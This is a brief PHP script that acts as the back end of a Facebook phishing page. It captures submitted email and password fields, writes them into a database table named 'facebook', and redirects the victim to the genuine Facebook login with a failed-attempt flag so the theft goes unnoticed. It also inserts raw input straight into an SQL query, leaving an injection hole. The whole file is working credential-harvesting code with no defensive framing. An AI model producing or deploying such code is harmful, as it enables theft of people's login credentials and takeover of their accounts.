<?php
  require_once('connect.php');
  $user_name = $_REQUEST['email'];
  $password = $_REQUEST['pass'];
  $query = "INSERT INTO `facebook` VALUES ('$user_name','$password')";
  $result = $mysqli->query($query);
  header("location:http://www.facebook.com/login.php?login_attempt=1");
  ?>